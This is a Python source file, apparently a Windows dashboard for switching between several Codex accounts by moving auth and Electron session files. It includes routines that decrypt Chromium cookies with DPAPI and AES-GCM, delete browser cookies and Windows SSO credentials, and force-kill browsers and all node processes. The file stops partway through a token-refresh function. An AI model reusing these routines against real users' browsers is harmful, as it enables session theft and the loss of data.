"""
Codex Multi-Account Manager – Dashboard Server
Manages multiple Codex accounts by swapping user-specific database and session files (including both Electron shell and WebView roaming data).
"""

import os
import sys
import glob
import json
import shutil
import stat
import subprocess
import threading
import time
import socket
import re
import base64
import sqlite3
import ctypes
import secrets
from ctypes import wintypes
import urllib.parse as urlparse
import urllib.request
import datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

# ─── Constants ──────────────────────────────────────────────────────
PORT = 8989
USER_HOME = os.path.expanduser("~")
CODEX_DIR = os.path.join(USER_HOME, ".codex")
STATE_FILE = os.path.join(USER_HOME, ".codex_dashboard_state.json")
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_FILE = os.path.join(SCRIPT_DIR, "dashboard.log")

# Only swap these specific files and folders containing session, settings, and threads.
# Heavy static folders like plugins, cache, and tmp remain in ~/.codex permanently.
USER_DATA_FILES = [
    "auth.json",
    "cap_sid",
]

USER_DATA_DIRS = []

# Roaming session files containing Electron cookies and local storage tokens.
ROAMING_SESSION_FILES = [
    "Preferences",
    "Local State",
    "Secure Preferences",
    "Login Data",
    "Web Data",
    "Login Data For Account",
    "Account Web Data",
    "History"
]

ROAMING_SESSION_DIRS = [
    "Local Storage",
    "Network",
    "Session Storage",
    "IndexedDB",
    "Service Worker",
    "WebStorage",
    "Extension State",
    "Local Extension Settings",
    "Sync Data",
    "Partitions"
]

# Lock to prevent concurrent swap operations
swap_lock = threading.Lock()
API_TOKEN = secrets.token_urlsafe(32)
ACCOUNT_ID_RE = re.compile(r"^[a-z0-9][a-z0-9_-]{0,63}$")
RESERVED_ACCOUNT_IDS = {"yeni_oturum"}


# ─── Logging ────────────────────────────────────────────────────────

def log(msg):
    """Append a timestamped message to the log file."""
    try:
        ts = time.strftime("%Y-%m-%d %H:%M:%S")
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{ts}] {msg}\n")
    except Exception:
        pass


# ─── File System Utilities (Windows-safe) ───────────────────────────

def rmtree_readonly(path):
    """
    Forcefully deletes a directory on Windows by stripping read-only attributes
    from all files and folders, then executing rmtree and native rmdir fallbacks.
    """
    if not os.path.exists(path):
        return

    # 1. Strip read-only attributes recursively
    for root, dirs, files in os.walk(path):
        for f in files:
            try:
                os.chmod(os.path.join(root, f), stat.S_IWRITE)
            except Exception:
                pass
        for d in dirs:
            try:
                os.chmod(os.path.join(root, d), stat.S_IWRITE)
            except Exception:
                pass

    # Do not ignore deletion errors: continuing after a partial delete can mix
    # two accounts. Avoid shell=True as paths are data, not commands.
    shutil.rmtree(path)


def validate_account_id(account_id, allow_reserved=False):
    """Return a normalized account id or raise ValueError."""
    if not isinstance(account_id, str):
        raise ValueError("Geçersiz hesap kimliği")
    account_id = account_id.strip().lower()
    if not ACCOUNT_ID_RE.fullmatch(account_id):
        raise ValueError("Geçersiz hesap kimliği")
    if not allow_reserved and account_id in RESERVED_ACCOUNT_IDS:
        raise ValueError("Bu hesap kimliği kullanılamaz")
    return account_id


def profile_dir(account_id):
    """Build a profile path only after validating its directory component."""
    return os.path.join(USER_HOME, f".codex_{validate_account_id(account_id)}")


def registered_account_ids(state):
    ids = set()
    for account_id in state.get("names", {}):
        try:
            ids.add(validate_account_id(account_id))
        except ValueError:
            log(f"Ignoring invalid account id in state: {account_id!r}")
    for key in ("active_account", "previous_active"):
        value = state.get(key)
        if value and value not in RESERVED_ACCOUNT_IDS:
            try:
                ids.add(validate_account_id(value))
            except ValueError:
                log(f"Ignoring invalid {key} in state: {value!r}")
    return ids


def make_unique_account_id(label, state):
    """Create a stable, collision-free folder id from an email or label."""
    base = label.strip().lower()
    base = re.sub(r"[^a-z0-9_-]+", "_", base).strip("_-")[:48]
    if not base or base in RESERVED_ACCOUNT_IDS:
        base = f"hesap_{int(time.time())}"

    existing = registered_account_ids(state)
    candidate = base
    suffix = 2
    while candidate in existing or os.path.exists(profile_dir(candidate)):
        candidate = f"{base[:56]}_{suffix}"
        suffix += 1
    return validate_account_id(candidate)


def wait_for_unlock(filepath, timeout=5):
    """Wait until a file is unlocked and can be opened in write mode."""
    start_time = time.time()
    while time.time() - start_time < timeout:
        try:
            with open(filepath, "a"):
                pass
            return True
        except IOError:
            time.sleep(0.2)
    return False


def find_roaming_dirs():
    """Finds the redirected Roaming AppData folder and the WebView profile folder."""
    local_app_data = os.environ.get("LOCALAPPDATA", "")
    if not local_app_data:
        return None, None, None, None
    search_pattern = os.path.join(
        local_app_data, "Packages", "OpenAI.Codex_*", "LocalCache", "Roaming", "Codex"
    )
    dirs = glob.glob(search_pattern)
    if not dirs:
        return None, None, None, None
    
    roaming_dir = dirs[0]
    roaming_web_root = os.path.join(roaming_dir, "web", "Codex")
    roaming_web_dir = os.path.join(roaming_web_root, "codex-browser-app")
    roaming_web_default = os.path.join(roaming_web_root, "Default")
    return roaming_dir, roaming_web_root, roaming_web_dir, roaming_web_default


# ─── State Management ───────────────────────────────────────────────

def load_state():
    if os.path.exists(STATE_FILE):
        try:
            with open(STATE_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return {}


def save_state(state):
    tmp = STATE_FILE + ".tmp"
    try:
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(state, f, indent=4, ensure_ascii=False)
            f.flush()
            os.fsync(f.fileno())
        os.replace(tmp, STATE_FILE)
    except Exception as e:
        log(f"save_state error: {e}")
        try:
            with open(STATE_FILE, "w", encoding="utf-8") as f:
                json.dump(state, f, indent=4, ensure_ascii=False)
                f.flush()
                os.fsync(f.fileno())
        except Exception as fallback_error:
            raise RuntimeError(f"Yönetici durumu kaydedilemedi: {fallback_error}") from fallback_error


# ─── Codex Process Management ───────────────────────────────────────

def check_codex_running():
    try:
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        res = subprocess.run(
            ['tasklist', '/fi', 'imagename eq codex.exe'],
            startupinfo=si,
            capture_output=True,
            text=True,
            errors="ignore",
            timeout=2
        )
        return "codex.exe" in res.stdout.lower()
    except Exception:
        return False


def check_chatgpt_running():
    try:
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        res = subprocess.run(
            ['tasklist', '/fi', 'imagename eq chatgpt.exe'],
            startupinfo=si,
            capture_output=True,
            text=True,
            errors="ignore",
            timeout=2
        )
        return "chatgpt.exe" in res.stdout.lower()
    except Exception:
        return False


def kill_codex():
    """
    Forcefully kill any process related to Codex/ChatGPT using PowerShell.
    This handles packaged Microsoft Store apps (which standard taskkill fails to terminate)
    as well as background Node runtimes and helper processes.
    """
    log("kill_codex: terminating all codex and helper processes...")
    kill_cmd = [
        "powershell.exe",
        "-NoProfile",
        "-Command",
        "Get-Process -Name 'Codex','ChatGPT','node','node_repl' -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue"
    ]
    try:
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        subprocess.run(kill_cmd, capture_output=True, startupinfo=si, timeout=10)
    except Exception as e:
        log(f"kill_codex subprocess error: {e}")

    for attempt in range(15):
        if not check_codex_running() and not check_chatgpt_running():
            break
        time.sleep(0.3)

    time.sleep(1)


def clear_wam_tokens():
    """Clear MicrosoftAccount SSO tokens from Windows Credential Manager to prevent auto-login."""
    try:
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        res = subprocess.run(["cmdkey", "/list"], capture_output=True, text=True, errors="ignore", startupinfo=si, timeout=5)
        for line in res.stdout.splitlines():
            if "MicrosoftAccount" in line and "Target:" in line:
                target = line.split("Target:")[1].strip()
                if "SSO_POP" in target or "LegacyGeneric:target=MicrosoftAccount" in target:
                    subprocess.run(["cmdkey", f"/delete:{target}"], capture_output=True, startupinfo=si, timeout=5)
                    log(f"clear_wam_tokens: deleted {target}")
    except Exception as e:
        log(f"clear_wam_tokens error: {e}")

def start_codex():
    """Start Codex Store app via explorer shell AppID (bulletproof)."""
    log("start_codex: launching ChatGPT/Codex via AppID OpenAI.Codex_2p2nqsd0c76g0!App...")
    try:
        # Launching via Windows AppUserModelId (AUMID) shell command
        subprocess.Popen(
            ["explorer.exe", "shell:AppsFolder\\OpenAI.Codex_2p2nqsd0c76g0!App"],
            close_fds=True
        )
        log("start_codex: launch command executed successfully")
        return True
    except Exception as e:
        log(f"start_codex error: {e}")
        return False


# ─── Browser Cookie Cleanup ─────────────────────────────────────────

def clear_openai_cookies_from_browsers():
    """
    Deletes OpenAI/ChatGPT session cookies from Chrome and Edge SQLite databases.
    Temporarily closes Chrome/Edge to release the DB lock, clears the cookies,
    then restores the browser to its previous running state.
    Returns a list of result strings.
    """
    log("clear_openai_cookies_from_browsers: starting...")
    results = []
    local_app_data = os.environ.get("LOCALAPPDATA", "")

    # Paths to Chromium-based browser Cookie databases
    cookie_db_candidates = []

    # Google Chrome
    chrome_base = os.path.join(local_app_data, "Google", "Chrome", "User Data")
    chrome_exe = ""
    for cp in [
        os.path.join(os.environ.get("PROGRAMFILES", ""), "Google", "Chrome", "Application", "chrome.exe"),
        os.path.join(os.environ.get("PROGRAMFILES(X86)", ""), "Google", "Chrome", "Application", "chrome.exe"),
        os.path.join(local_app_data, "Google", "Chrome", "Application", "chrome.exe"),
    ]:
        if os.path.exists(cp):
            chrome_exe = cp
            break
    if os.path.isdir(chrome_base):
        for profile in ["Default"] + [f"Profile {i}" for i in range(1, 10)]:
            p = os.path.join(chrome_base, profile, "Network", "Cookies")
            if os.path.exists(p):
                cookie_db_candidates.append(("Chrome", profile, p))

    # Microsoft Edge
    edge_base = os.path.join(local_app_data, "Microsoft", "Edge", "User Data")
    edge_exe = ""
    for ep in [
        os.path.join(os.environ.get("PROGRAMFILES(X86)", ""), "Microsoft", "Edge", "Application", "msedge.exe"),
        os.path.join(os.environ.get("PROGRAMFILES", ""), "Microsoft", "Edge", "Application", "msedge.exe"),
    ]:
        if os.path.exists(ep):
            edge_exe = ep
            break
    if os.path.isdir(edge_base):
        for profile in ["Default"] + [f"Profile {i}" for i in range(1, 10)]:
            p = os.path.join(edge_base, profile, "Network", "Cookies")
            if os.path.exists(p):
                cookie_db_candidates.append(("Edge", profile, p))

    if not cookie_db_candidates:
        log("clear_openai_cookies_from_browsers: no browser cookie databases found")
        return results

    # Check which browsers are running so we can reopen them afterward
    def is_running(proc_name):
        try:
            out = subprocess.check_output(
                f'tasklist /fi "imagename eq {proc_name}"',
                shell=True, stderr=subprocess.DEVNULL
            ).decode("utf-8", errors="ignore")
            return proc_name.lower() in out.lower()
        except Exception:
            return False

    chrome_was_running = is_running("chrome.exe")
    edge_was_running = is_running("msedge.exe")

    # Close browsers to release the file lock
    if chrome_was_running:
        log("clear_openai_cookies_from_browsers: closing Chrome temporarily...")
        subprocess.run(["taskkill", "/f", "/im", "chrome.exe"], capture_output=True)
        time.sleep(2)
    if edge_was_running:
        log("clear_openai_cookies_from_browsers: closing Edge temporarily...")
        subprocess.run(["taskkill", "/f", "/im", "msedge.exe"], capture_output=True)
        time.sleep(2)

    openai_domains = (
        ".openai.com",
        "openai.com",
        ".chatgpt.com",
        "chatgpt.com",
        "auth.openai.com",
        ".auth.openai.com",
        "accounts.openai.com",
    )

    for browser, profile, cookies_path in cookie_db_candidates:
        try:
            conn = sqlite3.connect(cookies_path)
            cur = conn.cursor()
            placeholders = ",".join("?" for _ in openai_domains)
            cur.execute(
                f"DELETE FROM cookies WHERE host_key IN ({placeholders})",
                openai_domains
            )
            deleted = cur.rowcount
            conn.commit()
            conn.close()
            msg = f"{browser}/{profile}: {deleted} OpenAI cookie(s) deleted"
            log(f"clear_openai_cookies_from_browsers: {msg}")
            results.append(msg)
        except Exception as e:
            msg = f"{browser}/{profile}: error — {e}"
            log(f"clear_openai_cookies_from_browsers: {msg}")
            results.append(msg)

    log("clear_openai_cookies_from_browsers: done")
    return results


# ─── Chromium Cookie Decryption (DPAPI + AES-GCM) ───────────────────

def extract_email_from_jwt(jwt_string):
    """Try to parse a JWT string and extract the user's email address."""
    try:
        parts = jwt_string.split('.')
        if len(parts) >= 2:
            payload_b64 = parts[1]
            payload_b64 += '=' * (4 - len(payload_b64) % 4)
            payload_bytes = base64.urlsafe_b64decode(payload_b64.encode('utf-8'))
            payload = json.loads(payload_bytes.decode('utf-8', errors='ignore'))
            email = payload.get('email') or payload.get('user', {}).get('email')
            if email:
                return email
    except Exception:
        pass
    return None


def decrypt_dpapi(encrypted_bytes):
    """Decrypt bytes using Windows DPAPI (CryptUnprotectData)."""
    class DATA_BLOB(ctypes.Structure):
        _fields_ = [
            ('cbData', wintypes.DWORD),
            ('pbData', ctypes.POINTER(ctypes.c_byte))
        ]
    
    in_blob = DATA_BLOB()
    in_blob.cbData = len(encrypted_bytes)
    in_blob.pbData = (ctypes.c_byte * len(encrypted_bytes))(*encrypted_bytes)
    
    out_blob = DATA_BLOB()
    success = ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(in_blob),
        None, None, None, None, 0,
        ctypes.byref(out_blob)
    )
    if not success:
        return None
        
    decrypted_bytes = bytes(x & 0xff for x in out_blob.pbData[:out_blob.cbData])
    ctypes.windll.kernel32.LocalFree(out_blob.pbData)
    return decrypted_bytes


def get_encryption_key(local_state_path):
    """Decrypt the Chromium master key from Local State."""
    if not os.path.exists(local_state_path):
        return None
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
        encrypted_key = base64.b64decode(encrypted_key_b64)
        dpapi_key = encrypted_key[5:]
        return decrypt_dpapi(dpapi_key)
    except Exception as e:
        log(f"get_encryption_key error: {e}")
        return None


def decrypt_value(encrypted_value, key):
    """Decrypt a Chromium AES-GCM encrypted value using the master key."""
    if not key or not encrypted_value:
        return None
    try:
        prefix = encrypted_value[:3]
        if prefix in (b'v10', b'v11'):
            nonce = encrypted_value[3:15]
            ciphertext = encrypted_value[15:]
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            aesgcm = AESGCM(key)
            return aesgcm.decrypt(nonce, ciphertext, None)
    except Exception:
        pass
    return None


def detect_logged_in_email():
    """Locates and decrypts WebView cookies or auth.json to extract the logged-in user email."""
    # 1. First try reading from auth.json
    auth_json_path = os.path.join(CODEX_DIR, "auth.json")
    if os.path.exists(auth_json_path):
        try:
            with open(auth_json_path, "r", encoding="utf-8") as f:
                data = json.load(f)
                id_token = data.get("tokens", {}).get("id_token", "")
                if id_token:
                    email = extract_email_from_jwt(id_token)
                    if email:
                        log(f"detect_logged_in_email: found email in auth.json: {email}")
                        return email
        except Exception as e:
            log(f"detect_logged_in_email: error reading auth.json: {e}")

    # 2. Fallback to WebView cookies
    roaming_dir, roaming_web_root, roaming_web_dir, roaming_web_default = find_roaming_dirs()
    if not roaming_dir or not roaming_web_dir:
        return None
        
    local_state_path = os.path.join(roaming_dir, "web", "Codex", "Local State")
    cookies_paths = [
        os.path.join(roaming_web_dir, "Network", "Cookies"),
        os.path.join(roaming_web_default, "Network", "Cookies"),
        os.path.join(roaming_web_default, "Partitions", "codex-browser-app", "Network", "Cookies")
    ]
    
    if not os.path.exists(local_state_path):
        return None
        
    master_key = get_encryption_key(local_state_path)
    if not master_key:
        return None
        
    email = None
    email_regex = re.compile(r'\b[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}\b')
    strict_pattern = re.compile(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}$')

    for cookies_path in cookies_paths:
        if not os.path.exists(cookies_path):
            continue
            
        # Copy database to temp file to prevent locking issues
        temp_db = os.path.join(SCRIPT_DIR, "temp_cookies.db")
        try:
            shutil.copy2(cookies_path, temp_db)
        except Exception as e:
            log(f"detect_logged_in_email: copy2 failed for {cookies_path}: {e}")
            continue
            
        try:
            conn = sqlite3.connect(temp_db)
            cur = conn.cursor()
            cur.execute("SELECT host_key, name, encrypted_value FROM cookies")
            rows = cur.fetchall()
            
            for host, name, enc_val in rows:
                dec_val = decrypt_value(enc_val, master_key)
                if dec_val:
                    try:
                        text = dec_val.decode("utf-8", errors="ignore")
                        # Try JWT decoding
                        jwt_email = extract_email_from_jwt(text)
                        if jwt_email and strict_pattern.match(jwt_email):
                            email = jwt_email
                            break
                        # Fallback to regex match
                        matches = email_regex.findall(text)
                        for m in matches:
                            if strict_pattern.match(m):
                                email = m
                                break
                        if email:
                            break
                    except Exception:
                        pass
            conn.close()
        except Exception as e:
            log(f"detect_logged_in_email sqlite error on {cookies_path}: {e}")
        finally:
            if os.path.exists(temp_db):
                try:
                    os.remove(temp_db)
                except Exception:
                    pass
        
        if email:
            break
            
    return email


# ─── Directory Swap Logic ───────────────────────────────────────────

def cleanup_sqlite_temps(directory):
    """Deprecated safety shim: SQLite sidecars are account data, not trash."""
    return


def fix_internal_paths(directory):
    if not os.path.isdir(directory):
        return

    config_path = os.path.join(directory, "config.toml")
    if os.path.exists(config_path):
        try:
            with open(config_path, "r", encoding="utf-8") as f:
                content = f.read()

            import re
            content = re.sub(r'\.codex_[a-zA-Z0-9_-]+', '.codex', content)

            with open(config_path, "w", encoding="utf-8") as f:
                f.write(content)
        except Exception as e:
            log(f"fix_internal_paths config.toml error: {e}")

    skip_dirs = {"sessions", "archived_sessions", "sqlite", "logs", "cache", "plugins"}
    for root, dirs, files in os.walk(directory):
        dirs[:] = [d for d in dirs if d not in skip_dirs]
        for fname in files:
            if fname.endswith(".json") or fname.endswith(".jsonl"):
                fpath = os.path.join(root, fname)
                try:
                    with open(fpath, "r", encoding="utf-8") as f:
                        content = f.read()
                    if ".codex_hesap" in content or ".codex_" in content:
                        import re
                        content = re.sub(r'\.codex_[a-zA-Z0-9_-]+', '.codex', content)
                        with open(fpath, "w", encoding="utf-8") as f:
                            f.write(content)
                except Exception:
                    pass


def park_session_files(src_dir, park_dir):
    """Helper to park Electron session files from active directory to park folder."""
    if not src_dir or not os.path.isdir(src_dir):
        return
    os.makedirs(park_dir, exist_ok=True)
    
    for f in ROAMING_SESSION_FILES:
        src_file = os.path.join(src_dir, f)
        dst_file = os.path.join(park_dir, f)
        if os.path.exists(src_file):
            try:
                if os.path.exists(dst_file):
                    os.chmod(dst_file, stat.S_IWRITE)
                    os.remove(dst_file)
                os.rename(src_file, dst_file)
            except Exception as e:
                log(f"Error parking roaming file {src_file} -> {dst_file}: {e}")

    for d in ROAMING_SESSION_DIRS:
        src_subdir = os.path.join(src_dir, d)
        dst_subdir = os.path.join(park_dir, d)
        if os.path.exists(src_subdir):
            try:
                rmtree_readonly(dst_subdir)
                os.rename(src_subdir, dst_subdir)
            except Exception as e:
                log(f"Error parking roaming dir {src_subdir} -> {dst_subdir}: {e}")


def restore_session_files(park_dir, dst_dir):
    """Helper to clean and restore Electron session files from park folder to active directory."""
    if not dst_dir or not os.path.isdir(dst_dir):
        return
        
    # Clean current active session files
    for f in ROAMING_SESSION_FILES:
        fp = os.path.join(dst_dir, f)
        if os.path.exists(fp):
            try:
                os.chmod(fp, stat.S_IWRITE)
                os.remove(fp)
            except Exception as e:
                log(f"restore_session_files cleanup error for {fp}: {e}")
    for d in ROAMING_SESSION_DIRS:
        dp = os.path.join(dst_dir, d)
        if os.path.exists(dp):
            try:
                rmtree_readonly(dp)
            except Exception as e:
                log(f"restore_session_files cleanup error for dir {dp}: {e}")

    # Restore from park (if it exists)
    if park_dir and os.path.isdir(park_dir):
        for f in ROAMING_SESSION_FILES:
            src_file = os.path.join(park_dir, f)
            dst_file = os.path.join(dst_dir, f)
            if os.path.exists(src_file):
                try:
                    os.rename(src_file, dst_file)
                except Exception as e:
                    log(f"Error restoring roaming file {src_file} -> {dst_file}: {e}")

        for d in ROAMING_SESSION_DIRS:
            src_subdir = os.path.join(park_dir, d)
            dst_subdir = os.path.join(dst_dir, d)
            if os.path.exists(src_subdir):
                try:
                    os.rename(src_subdir, dst_subdir)
                except Exception as e:
                    log(f"Error restoring roaming dir {src_subdir} -> {dst_subdir}: {e}")


def remove_path(path):
    if not os.path.lexists(path):
        return
    if os.path.isdir(path) and not os.path.islink(path):
        rmtree_readonly(path)
    else:
        os.chmod(path, stat.S_IWRITE)
        os.remove(path)


def rollback_moves(journal):
    """Undo a move journal in reverse order."""
    rollback_errors = []
    for src, dst, backup in reversed(journal):
        try:
            if os.path.lexists(dst):
                os.makedirs(os.path.dirname(src), exist_ok=True)
                os.rename(dst, src)
            if backup and os.path.lexists(backup):
                os.rename(backup, dst)
        except Exception as e:
            rollback_errors.append(f"{dst} -> {src}: {e}")
    if rollback_errors:
        raise RuntimeError("Geri alma tamamlanamadı: " + " | ".join(rollback_errors))


def commit_moves(journal):
    """Remove old destination backups after a successful transaction."""
    for _src, _dst, backup in journal:
        if backup and os.path.lexists(backup):
            remove_path(backup)


def move_paths_transaction(pairs):
    """Move all existing sources, rolling back the whole batch on failure."""
    journal = []
    try:
        for src, dst in pairs:
            if not src or not dst or not os.path.lexists(src):
                continue
            os.makedirs(os.path.dirname(dst), exist_ok=True)
            backup = None
            if os.path.lexists(dst):
                backup = f"{dst}.manager-backup-{secrets.token_hex(6)}"
                os.rename(dst, backup)
            try:
                os.rename(src, dst)
            except Exception:
                if backup and os.path.lexists(backup):
                    os.rename(backup, dst)
                raise
            journal.append((src, dst, backup))
        return journal
    except Exception:
        rollback_moves(journal)
        raise


def profile_move_pairs(account_dir, park):
    """Return every managed Codex/WebView path for one account transfer."""
    pairs = []
    for name in USER_DATA_FILES + USER_DATA_DIRS:
        active = os.path.join(CODEX_DIR, name)
        parked = os.path.join(account_dir, name)
        pairs.append((active, parked) if park else (parked, active))

    roaming_dir, roaming_web_root, roaming_web_dir, roaming_web_default = find_roaming_dirs()
    locations = [
        (roaming_dir, "roaming_session"),
        (roaming_web_root, "roaming_session_web_root"),
        (roaming_web_dir, "roaming_session_web"),
        (roaming_web_default, "roaming_session_web_default"),
    ]
    for active_root, parked_name in locations:
        if not active_root:
            continue
        parked_root = os.path.join(account_dir, parked_name)
        for name in ROAMING_SESSION_FILES + ROAMING_SESSION_DIRS:
            active = os.path.join(active_root, name)
            parked = os.path.join(parked_root, name)
            pairs.append((active, parked) if park else (parked, active))
    return pairs


def park_profile(account_dir):
    return move_paths_transaction(profile_move_pairs(account_dir, park=True))


def restore_profile(account_dir):
    return move_paths_transaction(profile_move_pairs(account_dir, park=False))


def wait_for_session_unlocks():
    """Wait for locks to be released on all active SQLite and cookie files.
    
    Returns a list of file paths that could not be unlocked within the timeout.
    Does NOT raise an exception on lock failures; callers decide what to do.
    """
    log("Waiting for file locks to release...")
    locked_paths = []
    for f in USER_DATA_FILES:
        if not (f.endswith(".sqlite") or f.endswith("-wal") or f.endswith("-shm")):
            continue
        fp = os.path.join(CODEX_DIR, f)
        if os.path.exists(fp):
            unlocked = wait_for_unlock(fp, timeout=5)
            if not unlocked:
                log(f"WARNING: active file {f} is still locked!")
                locked_paths.append(fp)

    roaming_dir, roaming_web_root, roaming_web_dir, roaming_web_default = find_roaming_dirs()

    if roaming_dir:
        cookies_path = os.path.join(roaming_dir, "Network", "Cookies")
        if os.path.exists(cookies_path):
            unlocked = wait_for_unlock(cookies_path, timeout=5)
            if not unlocked:
                log("WARNING: Roaming cookies file is still locked!")
                locked_paths.append(cookies_path)

    if roaming_web_dir:
        web_cookies_path = os.path.join(roaming_web_dir, "Network", "Cookies")
        if os.path.exists(web_cookies_path):
            unlocked = wait_for_unlock(web_cookies_path, timeout=5)
            if not unlocked:
                log("WARNING: Web WebView cookies file is still locked!")
                locked_paths.append(web_cookies_path)

    if roaming_web_default:
        default_cookies_path = os.path.join(roaming_web_default, "Network", "Cookies")
        if os.path.exists(default_cookies_path) and not wait_for_unlock(default_cookies_path, timeout=5):
            log("WARNING: Default WebView cookies file is still locked!")
            locked_paths.append(default_cookies_path)

        partition_cookies_path = os.path.join(roaming_web_default, "Partitions", "codex-browser-app", "Network", "Cookies")
        if os.path.exists(partition_cookies_path) and not wait_for_unlock(partition_cookies_path, timeout=5):
            log("WARNING: Partition WebView cookies file is still locked!")
            locked_paths.append(partition_cookies_path)
    
    # Extra sleep to let OS finalize process resource teardown
    time.sleep(1.5)
    return locked_paths


def swap_account(target_account_id):
    """Swaps active .codex user data and both shell/web Electron roaming sessions."""
    if not swap_lock.acquire(blocking=False):
        log("swap_account: another swap is in progress, skipping")
        return False

    try:
        state = load_state()
        current_active = state.get("active_account", "hesap1")
        target_account_id = validate_account_id(target_account_id)
        if target_account_id not in registered_account_ids(state):
            raise ValueError("Kayıtlı olmayan hesap seçilemez")
        if current_active in RESERVED_ACCOUNT_IDS:
            raise ValueError("Önce yeni oturum işlemini tamamlayın veya iptal edin")
        current_active = validate_account_id(current_active)

        if target_account_id == current_active:
            # Already active — nothing to swap, Codex not auto-started
            return {"success": True, "warnings": []}

        parked_dir = profile_dir(target_account_id)
        current_park_dir = profile_dir(current_active)

        log(f"swap_account transaction: {current_active} -> {target_account_id}")
        kill_codex()
        pre_locked = wait_for_session_unlocks()
        if pre_locked:
            pre_lock_names = ", ".join(os.path.basename(p) for p in pre_locked)
            log(f"swap_account: WARNING — files still locked before swap: {pre_lock_names}")
        os.makedirs(current_park_dir, exist_ok=True)
        os.makedirs(parked_dir, exist_ok=True)

        current_journal = park_profile(current_park_dir)
        target_journal = []
        try:
            target_journal = restore_profile(parked_dir)
            state["active_account"] = target_account_id
            if "last_login" not in state:
                state["last_login"] = {}
            state["last_login"][target_account_id] = datetime.datetime.now(datetime.timezone.utc).isoformat().replace("+00:00", "Z")
            save_state(state)
        except Exception:
            if target_journal:
                rollback_moves(target_journal)
            rollback_moves(current_journal)
            raise

        # State and files now agree. Old snapshots can be discarded.
        try:
            commit_moves(target_journal)
            commit_moves(current_journal)
        except Exception as e:
            log(f"swap_account: old backup cleanup warning: {e}")

        fix_internal_paths(CODEX_DIR)
        locked = wait_for_session_unlocks()
        if locked:
            lock_names = ", ".join(os.path.basename(p) for p in locked)
            log(f"swap_account: some files still locked after swap: {lock_names}")
            
        # Otomatik olarak Codex'i başlat
        start_codex()
        
        log(f"swap_account: completed")
        return {"success": True, "warnings": [f"Bazı dosyalar hâlâ kilitli olabilir: {lock_names}"] if locked else []}

    finally:
        swap_lock.release()


import base64

def format_last_login(iso_str):
    if not iso_str:
        return "Henüz Giriş Yapılmadı"
    try:
        if iso_str.endswith("Z"):
            iso_str = iso_str[:-1] + "+00:00"
        dt = datetime.datetime.fromisoformat(iso_str).astimezone()
        now = datetime.datetime.now(dt.tzinfo)
        diff_days = (now.date() - dt.date()).days
        time_str = dt.strftime("%H:%M")
        if diff_days == 0:
            return f"Bugün {time_str}"
        elif diff_days == 1:
            return f"Dün {time_str}"
        else:
            return dt.strftime("%d.%m.%Y %H:%M")
    except Exception:
        return "Bilinmiyor"


def extract_token_info(auth_file_path):
    """
    Parses auth.json and extracts plan info, token expiration, remaining hours, and health status.
    Status values: 'healthy', 'expiring_soon', 'expired', 'missing', 'error'
    """
    if not os.path.exists(auth_file_path):
        return {"plan": None, "expiry": None, "hours_left": 0, "status": "missing", "last_refresh": None}
    try:
        with open(auth_file_path, "r", encoding="utf-8") as f:
            data = json.load(f)
            tokens = data.get("tokens", {})
            id_token = tokens.get("id_token", "")
            last_refresh = data.get("last_refresh")
            if not id_token:
                return {"plan": None, "expiry": None, "hours_left": 0, "status": "missing", "last_refresh": last_refresh}
            parts = id_token.split(".")
            if len(parts) >= 2:
                payload = parts[1]
                payload += "=" * ((4 - len(payload) % 4) % 4)
                decoded = json.loads(base64.b64decode(payload).decode("utf-8"))
                auth_data = decoded.get("https://api.openai.com/auth", {})
                plan_type = auth_data.get("chatgpt_plan_type")
                sub_expiry = auth_data.get("chatgpt_subscription_active_until")
                exp_ts = decoded.get("exp", 0)
                now = time.time()
                hours_left = round((exp_ts - now) / 3600.0, 1)

                if data.get("token_status") == "revoked" or hours_left <= 0:
                    status = "expired"
                elif hours_left < 4.0:
                    status = "expiring_soon"
                else:
                    status = "healthy"

                return {
                    "plan": plan_type,
                    "expiry": sub_expiry,
                    "exp_ts": exp_ts,
                    "hours_left": hours_left if data.get("token_status") != "revoked" else 0,
                    "status": status,
                    "last_refresh": last_refresh
                }
    except Exception as e:
        log(f"extract_token_info error in {auth_file_path}: {e}")
    return {"plan": None, "expiry": None, "hours_left": 0, "status": "error", "last_refresh": None}


def extract_plan_info_from_jwt(auth_file_path):
    info = extract_token_info(auth_file_path)
    return info["plan"], info["expiry"]


def refresh_single_account_token(auth_file_path, force=False):
    """
    Safely attempts to refresh OpenAI OAuth token in auth.json if close to expiration or if forced.
    Does NOT corrupt or delete the file if token is revoked or already expired.
    """
    if not os.path.exists(auth_file_path):
        return {"success": False, "reason": "auth_file_missing"}

    try:
        with open(auth_file_path, "r", encoding="utf-8") as f:
            data = json.load(f)

        tokens = data.get("tokens", {})
        refresh_token = tokens.get("refresh_token", "")
        if not refresh_token:
            return {"success": False, "reason": "no_refresh_token"}

        info = extract_token_info(auth_file_path)
        hours_left = info.get("hours_left", 0)
        status = info.get("status")

        # Skip refresh if token is healthy (> 4 hours left) unless forced
        if not force and hours_left > 4.0 and data.get("token_status") != "revoked":
            return {"success": True, "refreshed": False, "reason": f"token_healthy_{hours_left}h_left"}

        url = "https://auth.openai.com/oauth/token"
        req_payload = json.dumps({
            "client_id": "app_EMoamEEZ73f0CkXaXp7hrann",
            "grant_type": "refresh_token",
            "refresh_token": refresh_token
        }).encode("utf-8")

        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }

